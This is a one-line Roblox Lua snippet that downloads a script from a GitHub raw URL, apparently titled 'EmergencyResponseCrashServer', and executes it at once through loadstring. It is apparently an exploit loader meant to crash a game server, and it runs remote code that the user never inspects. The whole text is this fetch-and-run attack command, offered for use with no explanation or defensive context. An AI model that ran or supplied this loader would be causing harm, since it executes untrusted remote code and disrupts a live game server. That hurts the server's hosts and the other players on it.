loadstring(game:HttpGet("https://raw.githubusercontent.com/racemodex/my-scripts/master/EmergencyResponseCrashServer", true))()
